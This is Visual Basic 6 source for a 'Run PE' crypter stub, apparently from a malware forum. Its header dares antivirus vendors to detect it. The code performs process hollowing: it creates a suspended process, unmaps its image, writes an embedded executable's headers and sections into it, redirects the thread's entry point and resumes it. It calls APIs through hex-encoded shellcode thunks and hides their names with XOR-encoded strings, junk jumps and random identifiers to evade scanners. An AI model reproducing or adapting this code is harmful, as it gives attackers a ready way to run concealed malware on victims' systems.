VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Class2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'---------------------------------------------------------------------------------------
' Project     : Run PE Generator v1.1 - W7
' Author      : OiJkN
' Now         : 21/03/2010  21:13
' Compile     : P-Code !!!
' Thanks to   : Cobein/Slayer/Karcrack/Squeezer/Abronsius/BUNNN
'
'                           Make a special detection for me ;)
'---------------------------------------------------------------------------------------

Option Explicit

Private Const h7Y3Y0dPeildCeKtpeof       As Long = &H5A4D&
Private Const L3E0q5EanCiAmqQECyOL        As Long = &H4550&

Private Const A4t0y1LZuvGQLoEWqKEt           As Long = &H40
Private Const w1H1L8oyanmDGJBZohRA           As Long = &HF8
Private Const g0d6y1bocOpMLmUlXcCc     As Long = &H28
Private Const M1Y3r2mealDSnbkIDgiP As Long = &H28


Private Const m7A7V5fdiGMTwLKadgYw             As String = "8B4C240851<f3T8D2rLqOgsgeYqnKtE>E8<c4j0C4ZiGmQgNTmujPLL>5989016631C0C3"
Private Const k5N8w3uANKsGffHPcEXD          As String = "8B4C2408565531C0648B70308B760C8B761C8B6E088B7E208B3638471875F3803F6B7407803F4B7402EBE789295D5EC3"


Private Const r2j2V2hRnXinkyNbjktS                    As String = "<f3T8D2rLqOgsgeYqnKtE>"
Private Const c5L3k7hNJJINwEMcDCSI                    As String = "<c4j0C4ZiGmQgNTmujPLL>"

Private Const P1f1n6TIcSJXhQQDEenA              As Long = &H10007
Private Const H4G5y1ytnGDZJUZWhAVW          As Long = &H4
Private Const q2u4o3buCrXSTRWIBImN                As Long = &H1000
Private Const Q5j7e0gLyqfAqhuGonbN               As Long = &H2000
Private Const N6y2r1uZNLFXUqMlqmCR    As Long = &H40

Private Type D1O4T8MeSMChqqpufYfK
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type o7E1L0bqjTBDYBFTdwMl
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type k1G6P5TXvXicurOkJBvJ
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type q1b2Y8qUWDWckZFOPNSp
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As k1G6P5TXvXicurOkJBvJ
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type

Private Type i7U5g8ADuTibLsyQsvLI
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type u1h6J3dGZFduVuGASCYI
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type r8t1W6stDbWBhnHPFkfg
    Virtuat8J0C8SyaYGuPFyKUDDp              As Long
    Size                        As Long
End Type

Private Type y0l7A3qqGyqPsXVDrMDt
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As r8t1W6stDbWBhnHPFkfg
End Type

Private Type Z6S3F1goCdwcBSeTQKcZ
    Signature                   As Long
    FileHeader                  As u1h6J3dGZFduVuGASCYI
    OptionalHeader              As y0l7A3qqGyqPsXVDrMDt
End Type

Private Type U1P3R5tuQSbfJZGMfncI
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type

Private Type U3T4J0KnPAQUWOnQufbP
    SecName                     As String * 8
    VirtualSize                 As Long
    Virtuat8J0C8SyaYGuPFyKUDDp              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type

Private Declare Function P7E8g2QkNSgqLYMwZyuW Lib "USER32" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As Long
Private Declare Function J4M3q3cWolIdCuqCTiEq Lib "gdi32" (ByVal hMetaFile As Long) As Long
Private Declare Function f0w5d1djrgMVWUZvELoC Lib "USER32" Alias "LoadCursorA" (ByVal hLib As Long, ByVal lngCursorID As Long) As Long
Private Declare Function Z7t8n2cUFmoJlqFBjvWX Lib "gdi32" (ByVal hDC As Long) As Long
Private Declare Sub I0p0O8yjWvTftbsfjJvu Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)
Private Declare Function Q4k2g2kCcCNHZJfPagcn Lib "WINMM.DLL" (ByVal hMixer As Long) As Long
Private Declare Function P5l7v3PsubhBJwdZZYdO Lib "gdi32" (ByVal hColorSpace As Long) As Long
Private Declare Function A1X8w2DGwXAecKTKBOYI Lib "gdi32" (ByVal hDC As Long) As Long

Private s2I5B4fbmpFablupTiCW         As Long
Private U2E6s8ryhahMYYnrumLa      As Long
Private r5J2g1NblHUHtVqpSARD         As Boolean
Private L6L4Q6fDYvolvOcwluTN          As Long
Private P3w3X5VBKKINkrdppFJM       As Long
Private U8J0l3VqTXlhQeDEenAc(&HFF)   As Byte
        
Public Function N8R6J6tnGpMyHNJUlAIJ() As Long
GoTo m8G0e8NgAujPYZXcNHOr
m8G0e8NgAujPYZXcNHOr:
End Function

Public Function P6C3Q1ktuswibiNaZpty(ByRef I5a0G6sMUKpkkjoZgnEe() As Byte, Optional C3I2D5FjhPEYPGTdMMAA As String) As Boolean
 GoTo h5v0D8UjbMtyQswLWqEr
h5v0D8UjbMtyQswLWqEr:
    Dim e7A5y4RdROIaYueouqDU                       As Long
GoTo T8R2r4qcgHgrlEBYtSLH
T8R2r4qcgHgrlEBYtSLH:
    Dim ti7U5g8ADuTibLsyQsvLI       As i7U5g8ADuTibLsyQsvLI
GoTo B3h0q0XSywewEMBgpqot
B3h0q0XSywewEMBgpqot:
    Dim tZ6S3F1goCdwcBSeTQKcZ       As Z6S3F1goCdwcBSeTQKcZ
GoTo H2V0M2bfiaOHqYbyYcqn
H2V0M2bfiaOHqYbyYcqn:
    Dim tU3T4J0KnPAQUWOnQufbP   As U3T4J0KnPAQUWOnQufbP
GoTo w2k6M3gJcIgwXwJDVFbL
w2k6M3gJcIgwXwJDVFbL:
    Dim tD1O4T8MeSMChqqpufYfK            As D1O4T8MeSMChqqpufYfK
GoTo M3O4q1NPYyqUWDJckZFB
M3O4q1NPYyqUWDJckZFB:
    Dim to7E1L0bqjTBDYBFTdwMl    As o7E1L0bqjTBDYBFTdwMl
GoTo q7t5l8JkjApsjJlROvkG
q7t5l8JkjApsjJlROvkG:
    Dim tq1b2Y8qUWDWckZFOPNSp                As q1b2Y8qUWDWckZFOPNSp
GoTo e3j8c5PPqLnHmLcocaUm
e3j8c5PPqLnHmLcocaUm:
    Dim t2v0b0MGYWsOmfbmESob                 As Long
GoTo M6S5i5qIJefoNtXmTZsB
M6S5i5qIJefoNtXmTZsB:
    Dim p2I6m3nsBqWfgejHNUML                  As Long
GoTo g2H1G2yoyaBmDGJBZDhR
g2H1G2yoyaBmDGJBZDhR:
    Dim l7s6J4RBikGimBvftTTt                    As Long
 GoTo E7N0t1SBBnaBXkfwjnNC
E7N0t1SBBnaBXkfwjnNC:
    If Not r5J2g1NblHUHtVqpSARD Then Exit Function
GoTo U2g5A4uAvILayvGQLoEX
U2g5A4uAvILayvGQLoEX:
    Call I0p0O8yjWvTftbsfjJvu(ti7U5g8ADuTibLsyQsvLI, I5a0G6sMUKpkkjoZgnEe(0), A4t0y1LZuvGQLoEWqKEt)
GoTo g0t6P4YXcNGNrFEUXaSq
g0t6P4YXcNGNrFEUXaSq:
    If Not ti7U5g8ADuTibLsyQsvLI.e_magic = h7Y3Y0dPeildCeKtpeof Then
GoTo v7Z1J5GLZjERFrSonPvO
v7Z1J5GLZjERFrSonPvO:
        Exit Function
GoTo p8U8F0RPlHfYUfvLgUeC
p8U8F0RPlHfYUfvLgUeC:
    End If
GoTo Z0E6F2SInvvyBXelQdcs
Z0E6F2SInvvyBXelQdcs:
    Call I0p0O8yjWvTftbsfjJvu(tZ6S3F1goCdwcBSeTQKcZ, I5a0G6sMUKpkkjoZgnEe(ti7U5g8ADuTibLsyQsvLI.e_lfanew), w1H1L8oyanmDGJBZohRA)
GoTo f6Z0O1qYauXcpmViIIjs
f6Z0O1qYauXcpmViIIjs:
    If Not tZ6S3F1goCdwcBSeTQKcZ.Signature = L3E0q5EanCiAmqQECyOL Then
GoTo t4p3t2lLWQiSoYjplvOc
t4p3t2lLWQiSoYjplvOc:
        Exit Function
GoTo a5l1E6jQIbjZFABEoyDT
a5l1E6jQIbjZFABEoyDT:
    End If
GoTo w8N0G8WecKTJAOYHHttV
w8N0G8WecKTJAOYHHttV:
    t2v0b0MGYWsOmfbmESob = H8s6F0YITYVgwUVeDjNc(c7y0q2(Chr$(223) & Chr$(13) & Chr$(188) & Chr$(206) & Chr$(37) & Chr$(18) & Chr$(51) & Chr$(48), Chr$(113) & Chr$(55) & Chr$(81) & Chr$(53) & Chr$(65) & Chr$(55) & Chr$(118) & Chr$(86) & Chr$(81) & Chr$(115)))
GoTo M7H6L5odaUmjGpBHDOfg
M7H6L5odaUmjGpBHDOfg:
    p2I6m3nsBqWfgejHNUML = H8s6F0YITYVgwUVeDjNc(c7y0q2(Chr$(192) & Chr$(20) & Chr$(218) & Chr$(236) & Chr$(108), Chr$(78) & Chr$(56) & Chr$(78) & Chr$(51) & Chr$(98) & Chr$(51) & Chr$(121) & Chr$(70) & Chr$(71) & Chr$(69)))
GoTo r8D4I6BhnHPFkffejUNU
r8D4I6BhnHPFkffejUNU:
    If C3I2D5FjhPEYPGTdMMAA = vbNullString Then
GoTo o2B3U4PnRyfbQkaRfpYY
o2B3U4PnRyfbQkaRfpYY:
        C3I2D5FjhPEYPGTdMMAA = Space(260)
GoTo n4C4k0gwjnNCsLIfBZfb
n4C4k0gwjnNCsLIfBZfb:
        l7s6J4RBikGimBvftTTt = G4g4C8wyBmfmRrcsvAqQ(t2v0b0MGYWsOmfbmESob, c7y0q2(Chr$(105) & Chr$(59) & Chr$(202) & Chr$(205) & Chr$(111) & Chr$(102) & Chr$(119) & Chr$(110) & Chr$(103) & Chr$(68) & Chr$(107) & Chr$(110) & Chr$(103) & Chr$(76) & Chr$(99) & Chr$(111) & Chr$(103) & Chr$(85), Chr$(74) & Chr$(53) & Chr$(110) & Chr$(56) & Chr$(89) & Chr$(54) & Chr$(107) & Chr$(66) & Chr$(70) & Chr$(72)))
GoTo c5u3R4kfJYrLeZOtDECH
c5u3R4kfJYrLeZOtDECH:
        T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, App.hInstance, StrPtr(C3I2D5FjhPEYPGTdMMAA), 260
GoTo b3b1S3hlogFUNvehCeiv
b3b1S3hlogFUNvehCeiv:
    End If
GoTo j1S1r3onQvPBFeFQKcZy
j1S1r3onQvPBFeFQKcZy:
    With tZ6S3F1goCdwcBSeTQKcZ.OptionalHeader
GoTo H5Y3f8MhVeCvacJciqfL
H5Y3f8MhVeCvacJciqfL:
        tD1O4T8MeSMChqqpufYfK.cb = Len(tD1O4T8MeSMChqqpufYfK)
GoTo v8y0Y5lQdcsyqQeXIprM
v8y0Y5lQdcsyqQeXIprM:
        l7s6J4RBikGimBvftTTt = G4g4C8wyBmfmRrcsvAqQ(t2v0b0MGYWsOmfbmESob, c7y0q2(Chr$(37) & Chr$(188) & Chr$(197) & Chr$(33) & Chr$(10) & Chr$(101) & Chr$(82) & Chr$(112) & Chr$(109) & Chr$(97) & Chr$(103) & Chr$(113) & Chr$(113) & Chr$(85), Chr$(89) & Chr$(55) & Chr$(102) & Chr$(51) & Chr$(119) & Chr$(48) & Chr$(86) & Chr$(119) & Chr$(67) & Chr$(81)))
GoTo Y5q7V6IJjsFhBgEWyWhb
Y5q7V6IJjsFhBgEWyWhb:
        T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, 0, StrPtr(C3I2D5FjhPEYPGTdMMAA), 0, 0, 0, H4G5y1ytnGDZJUZWhAVW, 0, 0, VarPtr(tD1O4T8MeSMChqqpufYfK), VarPtr(to7E1L0bqjTBDYBFTdwMl)
GoTo j3o4j7lvOdklyTOrtZgA
j3o4j7lvOdklyTOrtZgA:
        l7s6J4RBikGimBvftTTt = G4g4C8wyBmfmRrcsvAqQ(p2I6m3nsBqWfgejHNUML, c7y0q2(Chr$(48) & Chr$(116) & Chr$(87) & Chr$(108) & Chr$(111) & Chr$(99) & Chr$(114) & Chr$(84) & Chr$(107) & Chr$(103) & Chr$(117) & Chr$(77) & Chr$(100) & Chr$(81) & Chr$(103) & Chr$(97) & Chr$(118) & Chr$(107) & Chr$(109) & Chr$(108), Chr$(77) & Chr$(56) & Chr$(74) & Chr$(54) & Chr$(105) & Chr$(49) & Chr$(83) & Chr$(101) & Chr$(72) & Chr$(97)))
GoTo j4F0B0EpyDUutKADtTyb
j4F0B0EpyDUutKADtTyb:
        T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, to7E1L0bqjTBDYBFTdwMl.hProcess, .ImageBase
GoTo c2T1A2YHHttVeqSmRpIT
c2T1A2YHHttVeqSmRpIT:
        l7s6J4RBikGimBvftTTt = G4g4C8wyBmfmRrcsvAqQ(t2v0b0MGYWsOmfbmESob, c7y0q2(Chr$(122) & Chr$(63) & Chr$(220) & Chr$(20) & Chr$(203) & Chr$(225) & Chr$(108) & Chr$(67) & Chr$(110) & Chr$(110) & Chr$(109) & Chr$(97) & Chr$(71) & Chr$(122), Chr$(114) & Chr$(51) & Chr$(104) & Chr$(49) & Chr$(104) & Chr$(56) & Chr$(109) & Chr$(70) & Chr$(111) & Chr$(76)))
GoTo d4V7k1qCHEPghDENlSyL
d4V7k1qCHEPghDENlSyL:
        T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, to7E1L0bqjTBDYBFTdwMl.hProcess, .ImageBase, .SizeOfImage, q2u4o3buCrXSTRWIBImN Or Q5j7e0gLyqfAqhuGonbN, N6y2r1uZNLFXUqMlqmCR
GoTo U4t0r4STRWHAHlNwOSUM
U4t0r4STRWHAHlNwOSUM:
        l7s6J4RBikGimBvftTTt = G4g4C8wyBmfmRrcsvAqQ(t2v0b0MGYWsOmfbmESob, c7y0q2(Chr$(211) & Chr$(122) & Chr$(103) & Chr$(106) & Chr$(91) & Chr$(46) & Chr$(114) & Chr$(109) & Chr$(97) & Chr$(103) & Chr$(113) & Chr$(113) & Chr$(79) & Chr$(103) & Chr$(111) & Chr$(109) & Chr$(112) & Chr$(123), Chr$(117) & Chr$(49) & Chr$(77) & Chr$(49) & Chr$(84) & Chr$(54) & Chr$(72) & Chr$(73) & Chr$(83) & Chr$(112)))
GoTo o3y5c3lbSgqZZMZyJXEW
o3y5c3lbSgqZZMZyJXEW:
        T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, to7E1L0bqjTBDYBFTdwMl.hProcess, .ImageBase, VarPtr(I5a0G6sMUKpkkjoZgnEe(0)), .SizeOfHeaders, 0
GoTo k7O0A8MJfCagcnqGbcmy
k7O0A8MJfCagcnqGbcmy:
        For e7A5y4RdROIaYueouqDU = 0 To tZ6S3F1goCdwcBSeTQKcZ.FileHeader.NumberOfSections - 1
GoTo M7F4r2GuajkinYRYDQPf
M7F4r2GuajkinYRYDQPf:
            I0p0O8yjWvTftbsfjJvu tU3T4J0KnPAQUWOnQufbP, I5a0G6sMUKpkkjoZgnEe(ti7U5g8ADuTibLsyQsvLI.e_lfanew + w1H1L8oyanmDGJBZohRA + M1Y3r2mealDSnbkIDgiP * e7A5y4RdROIaYueouqDU), Len(tU3T4J0KnPAQUWOnQufbP)
GoTo Y5T7H0jSUoRVjtPcPCdA
Y5T7H0jSUoRVjtPcPCdA:
            T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, to7E1L0bqjTBDYBFTdwMl.hProcess, .ImageBase + tU3T4J0KnPAQUWOnQufbP.Virtuat8J0C8SyaYGuPFyKUDDp, VarPtr(I5a0G6sMUKpkkjoZgnEe(tU3T4J0KnPAQUWOnQufbP.PointerToRawData)), tU3T4J0KnPAQUWOnQufbP.SizeOfRawData, 0
GoTo a0k0n7RrDvPMjFdVSduJ
a0k0n7RrDvPMjFdVSduJ:
        Next e7A5y4RdROIaYueouqDU
GoTo h4f0w4cJdiqgMVVUZyDK
h4f0w4cJdiqgMVVUZyDK:
        tq1b2Y8qUWDWckZFOPNSp.ContextFlags = P1f1n6TIcSJXhQQDEenA
GoTo R5d8v0rQfYIqsNptIFnB
R5d8v0rQfYIqsNptIFnB:
        l7s6J4RBikGimBvftTTt = G4g4C8wyBmfmRrcsvAqQ(p2I6m3nsBqWfgejHNUML, c7y0q2(Chr$(8) & Chr$(250) & Chr$(103) & Chr$(91) & Chr$(10) & Chr$(67) & Chr$(109) & Chr$(108) & Chr$(118) & Chr$(103) & Chr$(122) & Chr$(118) & Chr$(86) & Chr$(106) & Chr$(112) & Chr$(103) & Chr$(99) & Chr$(102), Chr$(107) & Chr$(50) & Chr$(80) & Chr$(56) & Chr$(67) & Chr$(52) & Chr$(100) & Chr$(84) & Chr$(116) & Chr$(117)))
GoTo J1k8G6CgFWvXicudBkuB
J1k8G6CgFWvXicudBkuB:
        T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, to7E1L0bqjTBDYBFTdwMl.hThread, VarPtr(tq1b2Y8qUWDWckZFOPNSp)
GoTo Y6B3X4iGBegNTmujPLLK
Y6B3X4iGBegNTmujPLLK:
        l7s6J4RBikGimBvftTTt = G4g4C8wyBmfmRrcsvAqQ(t2v0b0MGYWsOmfbmESob, c7y0q2(Chr$(211) & Chr$(122) & Chr$(103) & Chr$(106) & Chr$(91) & Chr$(46) & Chr$(114) & Chr$(109) & Chr$(97) & Chr$(103) & Chr$(113) & Chr$(113) & Chr$(79) & Chr$(103) & Chr$(111) & Chr$(109) & Chr$(112) & Chr$(123), Chr$(117) & Chr$(49) & Chr$(77) & Chr$(49) & Chr$(84) & Chr$(54) & Chr$(72) & Chr$(73) & Chr$(83) & Chr$(112)))
GoTo q5i7H6gvmphGjOMtiDsj
q5i7H6gvmphGjOMtiDsj:
        T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, to7E1L0bqjTBDYBFTdwMl.hProcess, tq1b2Y8qUWDWckZFOPNSp.Ebx + 8, VarPtr(.ImageBase), 4, 0
GoTo g7a4N2ovJlFkIamaYSkh
g7a4N2ovJlFkIamaYSkh:
        tq1b2Y8qUWDWckZFOPNSp.Eax = .ImageBase + .AddressOfEntryPoint
GoTo t5n8p0SToqAXFhwekEMB
t5n8p0SToqAXFhwekEMB:
        l7s6J4RBikGimBvftTTt = G4g4C8wyBmfmRrcsvAqQ(p2I6m3nsBqWfgejHNUML, c7y0q2(Chr$(26) & Chr$(210) & Chr$(3) & Chr$(251) & Chr$(52) & Chr$(61) & Chr$(111) & Chr$(108) & Chr$(118) & Chr$(103) & Chr$(122) & Chr$(118) & Chr$(86) & Chr$(106) & Chr$(112) & Chr$(103) & Chr$(99) & Chr$(102), Chr$(115) & Chr$(56) & Chr$(105) & Chr$(55) & Chr$(118) & Chr$(50) & Chr$(111) & Chr$(110) & Chr$(69) & Chr$(116)))
GoTo X3T3W1BIlNwOSUMlOsdZ
X3T3W1BIlNwOSUMlOsdZ:
        T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, to7E1L0bqjTBDYBFTdwMl.hThread, VarPtr(tq1b2Y8qUWDWckZFOPNSp)
GoTo o1A7F2wwkXwUhydugkKy
o1A7F2wwkXwUhydugkKy:
        l7s6J4RBikGimBvftTTt = G4g4C8wyBmfmRrcsvAqQ(p2I6m3nsBqWfgejHNUML, c7y0q2(Chr$(50) & Chr$(130) & Chr$(162) & Chr$(133) & Chr$(179) & Chr$(245) & Chr$(109) & Chr$(103) & Chr$(86) & Chr$(106) & Chr$(112) & Chr$(103) & Chr$(99) & Chr$(102), Chr$(105) & Chr$(52) & Chr$(99) & Chr$(49) & Chr$(70) & Chr$(54) & Chr$(98) & Chr$(121) & Chr$(109) & Chr$(100)))
GoTo Y7n2g1LHTWkGIRbWPhCV
Y7n2g1LHTWkGIRbWPhCV:
        T5I5H5vXwJDVEbLVbXjA l7s6J4RBikGimBvftTTt, to7E1L0bqjTBDYBFTdwMl.hThread, 0
GoTo r6N4W3aLELpDCSVYQoEv
r6N4W3aLELpDCSVYQoEv:
    End With
GoTo j3U7R4jtPcQCdAaIZLPp
j3U7R4jtPcQCdAaIZLPp:
    P6C3Q1ktuswibiNaZpty = True
GoTo r0v2M6FdVSduJeSbAuXZ
r0v2M6FdVSduJeSbAuXZ:
End Function

Public Function T5I5H5vXwJDVEbLVbXjA(ByVal l7s6J4RBikGimBvftTTt As Long, ParamArray Params()) As Long
GoTo y3V5T0HIGLipvbnmDHKB
y3V5T0HIGLipvbnmDHKB:
    Dim T4c6J0hjQWpwmSOONSDJ        As Long
GoTo y2D7V4rUZnjSfFGgpCdw
y2D7V4rUZnjSfFGgpCdw:
    Dim e7A5y4RdROIaYueouqDU1           As Long
GoTo T7J6J3OgQmWhmjuMaijs
T7J6J3OgQmWhmjuMaijs:
    Dim p5c0N4BVAYqCqnhAvUEO       As String
GoTo G0e5N3mukQLLKPAHOeFE
G0e5N3mukQLLKPAHOeFE:
    Dim l6s2L5hrPyZoVcuDsYTU     As String
GoTo v7p6G6OMtiDtkwIqqeeF
v7p6G6OMtiDtkwIqqeeF:
    If l7s6J4RBikGimBvftTTt = 0 Then Exit Function
GoTo i8X7W8MYMKEWTpZkpmwP
i8X7W8MYMKEWTpZkpmwP:
    For e7A5y4RdROIaYueouqDU1 = UBound(Params) To 0 Step -1
GoTo F4c6J7UjQWpwmTOONSDy
F4c6J7UjQWpwmTOONSDy:
        l6s2L5hrPyZoVcuDsYTU = l6s2L5hrPyZoVcuDsYTU & c7y0q2(Chr$(202) & Chr$(192), Chr$(113) & Chr$(48) & Chr$(106) & Chr$(54) & Chr$(88) & Chr$(52) & Chr$(119) & Chr$(72) & Chr$(84) & Chr$(121)) & I2r0d0pFJMDcFkUQFZPG(CLng(Params(e7A5y4RdROIaYueouqDU1)))
GoTo t4j0E1wXAePLUKBPZIIu
t4j0E1wXAePLUKBPZIIu:
    Next
GoTo W8U5u5tfjKwypIFbvWbX
W8U5u5tfjKwypIFbvWbX:
    T4c6J0hjQWpwmSOONSDJ = VarPtr(U8J0l3VqTXlhQeDEenAc(0))
GoTo S4k1H3aVOhCUPEkstrvh
S4k1H3aVOhCUPEkstrvh:
    T4c6J0hjQWpwmSOONSDJ = T4c6J0hjQWpwmSOONSDJ + (UBound(Params) + 2) * 5
GoTo E2o0B3VXPoEygOQlOSgq
E2o0B3VXPoEygOQlOSgq:
    T4c6J0hjQWpwmSOONSDJ = l7s6J4RBikGimBvftTTt - T4c6J0hjQWpwmSOONSDJ - 5
GoTo B2C7P6kMtLvBbCNHZWsO
B2C7P6kMtLvBbCNHZWsO:
    p5c0N4BVAYqCqnhAvUEO = m7A7V5fdiGMTwLKadgYw
GoTo I0v1Z7JvGeYCEkFKSInv
I0v1Z7JvGeYCEkFKSInv:
    p5c0N4BVAYqCqnhAvUEO = Replace(p5c0N4BVAYqCqnhAvUEO, r2j2V2hRnXinkyNbjktS, l6s2L5hrPyZoVcuDsYTU)
GoTo Z4c0H2sFFUYbTrHAjRUo
Z4c0H2sFFUYbTrHAjRUo:
    p5c0N4BVAYqCqnhAvUEO = Replace(p5c0N4BVAYqCqnhAvUEO, c5L3k7hNJJINwEMcDCSI, I2r0d0pFJMDcFkUQFZPG(T4c6J0hjQWpwmSOONSDJ))
GoTo G2Z3E3qrSbnPjOmFeFQK
G2Z3E3qrSbnPjOmFeFQK:
    Call w0Q4y1yiKgeHoGryWyHB(p5c0N4BVAYqCqnhAvUEO)
GoTo S0Y1T4VgwMUVeDwacJPi
S0Y1T4VgwMUVeDwacJPi:
    T5I5H5vXwJDVEbLVbXjA = v0P2u1hhJSeGaFdyVyHB
GoTo M0h5d5gRYfyWWlbeWyYD
M0h5d5gRYfyWWlbeWyYD:
End Function

Private Function I2r0d0pFJMDcFkUQFZPG(ByVal J7r5R7PbpXoaeFspjCWr As Long) As String
GoTo q4N6X2cmVVIIjsFgBfEW
q4N6X2cmVVIIjsFgBfEW:
    Dim b5d7r1cdmvrVkEXqlaGP(3)   As Byte
GoTo K0y7I1cMWcYkBCXZiGnQ
K0y7I1cMWcYkBCXZiGnQ:
    Dim e7A5y4RdROIaYueouqDU2           As Long
GoTo V0J5j4FABEpipUugyADt
V0J5j4FABEpipUugyADt:
    I0p0O8yjWvTftbsfjJvu b5d7r1cdmvrVkEXqlaGP(0), J7r5R7PbpXoaeFspjCWr, &H4
GoTo C5K8p5pftEmmZMnKWkSj
C5K8p5pftEmmZMnKWkSj:
    For e7A5y4RdROIaYueouqDU2 = 0 To 3
GoTo w0b3N1ZWtPntpCFToqAK
w0b3N1ZWtPntpCFToqAK:
        I2r0d0pFJMDcFkUQFZPG = I2r0d0pFJMDcFkUQFZPG & Right(c7y0q2(Chr$(24), Chr$(80) & Chr$(56) & Chr$(83) & Chr$(54) & Chr$(118) & Chr$(54) & Chr$(104) & Chr$(98) & Chr$(116) & Chr$(113)) & Hex(b5d7r1cdmvrVkEXqlaGP(e7A5y4RdROIaYueouqDU2)), 2)
GoTo t4m1a8ndJRSQVHAHkwvN
t4m1a8ndJRSQVHAHkwvN:
    Next
GoTo t8n2c3FmoKmqFPjwkXwU
t8n2c3FmoKmqFPjwkXwU:
End Function


Private Function v0P2u1hhJSeGaFdyVyHB() As Long
GoTo F7v0U8uKADuUvbZHyQHw
F7v0U8uKADuUvbZHyQHw:
    I0p0O8yjWvTftbsfjJvu L6L4Q6fDYvolvOcwluTN, ByVal ObjPtr(Me), &H4
GoTo B2t8g6IRdGZEcuGurlEB
B2t8g6IRdGZEcuGurlEB:
    L6L4Q6fDYvolvOcwluTN = L6L4Q6fDYvolvOcwluTN + &H1C
GoTo I7C1E3ghDFOlTyMsSaPy
I7C1E3ghDFOlTyMsSaPy:
    I0p0O8yjWvTftbsfjJvu P3w3X5VBKKINkrdppFJM, ByVal L6L4Q6fDYvolvOcwluTN, &H4
GoTo T3S4I0ImNPSVNlPtdZOi
T3S4I0ImNPSVNlPtdZOi:
    I0p0O8yjWvTftbsfjJvu ByVal L6L4Q6fDYvolvOcwluTN, VarPtr(U8J0l3VqTXlhQeDEenAc(0)), &H4
GoTo B7F2w8lXVhydugkLypIG
B7F2w8lXVhydugkLypIG:
    v0P2u1hhJSeGaFdyVyHB = N8R6J6tnGpMyHNJUlAIJ
GoTo S7N3P4dsOPZidHWpKcXN
S7N3P4dsOPZidHWpKcXN:
    I0p0O8yjWvTftbsfjJvu ByVal L6L4Q6fDYvolvOcwluTN, P3w3X5VBKKINkrdppFJM, &H4
GoTo b6k6o4SZERQgjmeDSLud
b6k6o4SZERQgjmeDSLud:
End Function

